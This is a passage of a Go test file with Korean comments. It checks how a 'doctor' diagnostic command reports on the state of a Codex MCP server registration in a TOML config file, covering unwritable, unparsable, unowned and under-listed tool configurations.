	// doctor는 실패 항목이 있으면 오류를 낼 수 있다 — 이 테스트는 [3] 렌더만 보므로 출력으로 판정하고
	// 오류는 로그로 남긴다.
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev", false); err != nil {
		t.Logf("runDoctor: %v", err)
	}
	out := buf.String()
	if !strings.Contains(out, "user_version=1 quick_check=ok") {
		t.Fatalf("기존 부분문자열 단정이 깨졌다:\n%s", out)
	}
	if !strings.Contains(out, "quick_check=ok indexes=3/3") {
		t.Fatalf("indexes 병기가 quick_check 뒤에 없다:\n%s", out)
	}
}

// TestDoctorCodexGateLabel — D89 소비자 5(라벨 생성기). 미배선이면 그 switch에 기본 갈래가
// 없어 정상 계열 라벨(marker …)이 경고 없이 나간다.
func TestDoctorCodexGateLabel(t *testing.T) {
	home := isolateCodexHome(t)
	writeCodexConfig(t, home, codexGateFixture)
	out, _ := doctorOut(t, t.TempDir(), false)
	if !strings.Contains(out, "codex=기입불가") {
		t.Errorf("[20] 라벨에 기입불가가 없다:\n%s", out)
	}
	if strings.Contains(out, "codex=marker ") {
		t.Errorf("[20]이 정상 계열 라벨을 냈다:\n%s", out)
	}
	if !strings.Contains(out, anomalyOutputInvalid.reason()) {
		t.Errorf("[20] 사유 줄이 없다:\n%s", out)
	}
	// 소비자 4 — --fix가 기입 불가를 **명시적으로** 말해야 한다. 부정 단정만 두면 게이트가
	// 없을 때도 그 문구가 안 나오므로(그 픽스처는 TableFound=false라 "관리 테이블이
	// 없습니다"가 나간다) 감시선이 서지 않는다.
	fixOut, _ := doctorOut(t, t.TempDir(), true)
	if !strings.Contains(fixOut, "기입 가능한 상태가 아닙니다") {
		t.Errorf("--fix가 기입불가 상태를 그렇게 보고하지 않았다:\n%s", fixOut)
	}
	if strings.Contains(fixOut, "이미 현재 형식") {
		t.Errorf("--fix가 기입불가 상태를 정상으로 보고했다:\n%s", fixOut)
	}
}

// TestDoctorCodexInputUnparsable — D89 부수 결정 ②. Codex가 통째로 읽지 못하는 파일을
// doctor가 정상으로 보고하면 안 된다. failed에 계상하지 않으므로 종료코드는 그대로다.
func TestDoctorCodexInputUnparsable(t *testing.T) {
	home := isolateCodexHome(t)
	// 같은 테이블 헤더 두 번 — **파서만** 거부한다. codexManagedSpans는 우리 두 이름의 중복만
	// 세므로 [a]가 겹쳐도 anomalyNone이고, 그래서 이 픽스처는 이상 갈래에 걸리지 않고
	// InputParses 축을 홀로 물린다(이상 갈래가 대신 물면 무엇을 쟀는지 알 수 없다).
	writeCodexConfig(t, home, "[a]\nx = 1\n\n[a]\ny = 2\n")
	out, err := doctorOut(t, t.TempDir(), false)
	if !strings.Contains(out, "[16]") || !strings.Contains(out, "TOML로 파스되지 않습니다") {
		t.Errorf("[16]에 입력 파스 실패 줄이 없다:\n%s", out)
	}
	if err != nil {
		t.Errorf("입력 파스 실패가 종료코드를 바꿨다: %v", err)
	}
}

// TestDoctorCodexSingleVerdict — [16]과 [20]이 같은 판정을 쓴다. 판정원이 갈리면 같은 파일을
// 두 절이 다르게 부른다.
func TestDoctorCodexSingleVerdict(t *testing.T) {
	home := isolateCodexHome(t)
	writeCodexConfig(t, home, codexGateFixture)
	out, _ := doctorOut(t, t.TempDir(), false)
	// **긍정 단정이어야 한다.** 부정형("테이블=존재" 없음)은 판정원 교체 전에도 통과한다 —
	// 그 픽스처에서 현행 probe는 관리 테이블을 못 잡아 [16]이 "테이블=부재"를 인쇄한다.
	if !strings.Contains(out, "[16] codex: [mcp_servers.ctr] 테이블=기입불가") {
		t.Errorf("[16]이 게이트 상태를 모른다:\n%s", out)
	}
	// **`[16]` 줄에 한정한다.** 사유만 보면 [20]이 이미 같은 문자열을 인쇄하므로 늘 참이고,
	// TestDoctorCodexGateLabel의 단정과 완전히 겹쳐 [16]의 사유 줄을 통째로 지워도 물지 않는다.
	if !strings.Contains(out, "[16] warning: "+anomalyOutputInvalid.reason()) {
		t.Errorf("[16] 사유 줄이 없다:\n%s", out)
	}
}

// TestDoctorCodexUnownedTable — [16]의 미소유 갈래(신설). 소유를 구별하면 그 갈래의 문면이
// 바뀌고 막다른 경로에 조치가 생긴다(스펙 §2.3·§1.4-마가 이 픽스처를 명시적으로 요구한다).
func TestDoctorCodexUnownedTable(t *testing.T) {
	home := isolateCodexHome(t)
	writeCodexConfig(t, home, "[mcp_servers.ctr]\ncommand = \"other-binary\"\n")
	out, _ := doctorOut(t, t.TempDir(), false)
	if !strings.Contains(out, "테이블=존재(사용자 소유)") {
		t.Errorf("[16]이 미소유를 구별하지 않는다:\n%s", out)
	}
	if !strings.Contains(out, "이름을 바꾸거나 수동으로 정리한 뒤") {
		t.Errorf("[16] 막다른 갈래에 조치가 없다:\n%s", out)
	}
}

// TestDoctorCodexToolsShort — D91. 모자란 목록만 알린다. 넓힌 것은 통과하고, 키가 아예 없는
// 등록물은 부족으로 세지 않는다(부재와 빈 배열의 의미가 반대다).
func TestDoctorCodexToolsShort(t *testing.T) {
	const want = "도구 목록이 프로필보다 모자랍니다"
	cases := []struct {
		name  string
		table string
		short bool
	}{
		{"모자람", "enabled_tools = [\"ctr_search\"]\n", true},
		{"정확히 프로필대로", "enabled_tools = [\"ctr_search\", \"ctr_fetch\", \"ctr_transform\", \"ctr_record_event\", \"ctr_session_summary\", \"ctr_export_events\", \"ctr_index\", \"ctr_fetch_and_index\"]\n", false},
		{"사용자가 넓힘", "enabled_tools = [\"ctr_search\", \"ctr_fetch\", \"ctr_transform\", \"ctr_record_event\", \"ctr_session_summary\", \"ctr_export_events\", \"ctr_index\", \"ctr_fetch_and_index\", \"ctr_execute\"]\n", false},
		{"키 부재", "", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			home := isolateCodexHome(t)
			src := "[mcp_servers.ctr]\ncommand = \"context-router\"\nargs = [\"--enable\", \"ingest,net\"]\n" + c.table +
				"\n[mcp_servers.ctr.env]\nCTR_MANAGED = \"" + hookMarker("0.17.0") + "\"\n"
			writeCodexConfig(t, home, src)
			out, _ := doctorOut(t, t.TempDir(), false)
			if got := strings.Contains(out, want); got != c.short {
				t.Errorf("부족 경고=%v want %v\n%s", got, c.short, out)
			}
			if c.short && !strings.Contains(out, "손으로 더한 항목이 있으면 사라집니다") {
				t.Errorf("권고가 되돌림을 예고하지 않는다:\n%s", out)
			}
		})
	}
}

// TestDoctorCodexToolsOnlyWhenWritable — 기입 없이 이탈하는 상태에는 도구 조치를 권하지
// 않는다 — 실행해도 바뀌지 않는 명령을 안내하게 된다.
func TestDoctorCodexToolsOnlyWhenWritable(t *testing.T) {
	home := isolateCodexHome(t)
	writeCodexConfig(t, home, "[mcp_servers.ctr]\ncommand = \"other\"\nenabled_tools = [\"x\"]\n")
	out, _ := doctorOut(t, t.TempDir(), false)
	if strings.Contains(out, "도구 목록이 프로필보다 모자랍니다") {
		t.Errorf("사용자 소유 테이블에 도구 조치를 권했다:\n%s", out)
	}
}

// TestDoctorCodexToolsArgsUnreadable — D91 리뷰 F1. args를 프로필로 되읽지 못하면
// installCodexConfigBlock의 keepArgs가 서서 hook install --codex도 목록을 **보존한다** —
// 그 상태에 기본 문면을 내면 실행해도 부족이 그대로인 명령을 조치로 안내하게 된다.
// 감지는 유지하고(D91이 유보를 명시적으로 반대한다) 문면만 가른다.
func TestDoctorCodexToolsArgsUnreadable(t *testing.T) {
	home := isolateCodexHome(t)
	src := "[mcp_servers.ctr]\ncommand = \"context-router\"\nargs = [\"--profile\", \"global-search\"]\n" +
		"enabled_tools = [\"custom\"]\n\n[mcp_servers.ctr.env]\nCTR_MANAGED = \"" + hookMarker("0.17.0") + "\"\n"
	writeCodexConfig(t, home, src)
	// 픽스처가 실제로 그 갈래인지 먼저 못박는다 — 다른 상태로 흘러가면 아래 단정이 무엇을
	// 쟀는지 알 수 없어진다(그 축이 무너져도 문면 단정은 조용히 통과할 수 있다).
	if v := codexRegistrationVerdict([]byte(src), "0.17.0"); v.State != mcpWritten ||
		!v.TableFound || !v.ToolsPresent || v.ArgsReadable {
		t.Fatalf("픽스처가 되읽기 실패 갈래가 아니다: state=%d table=%v toolsPresent=%v argsReadable=%v",
			v.State, v.TableFound, v.ToolsPresent, v.ArgsReadable)
	}
	out, _ := doctorOut(t, t.TempDir(), false)
	if !strings.Contains(out, "args를 프로필로 해석하지 못해") {
		t.Errorf("되읽기 실패를 알리지 않는다:\n%s", out)
	}
	if !strings.Contains(out, "hook install --codex --enable <프로필>") {
		t.Errorf("프로필을 명시하는 형태를 안내하지 않는다:\n%s", out)
	}
	// 기본 문면이 그대로 나가면 그 명령은 이 상태에서 목록을 보존한다 — 조치가 아니다.
	if strings.Contains(out, "hook install --codex로 반영하세요") {
		t.Errorf("목록을 보존하는 명령을 조치로 안내했다:\n%s", out)
	}
}
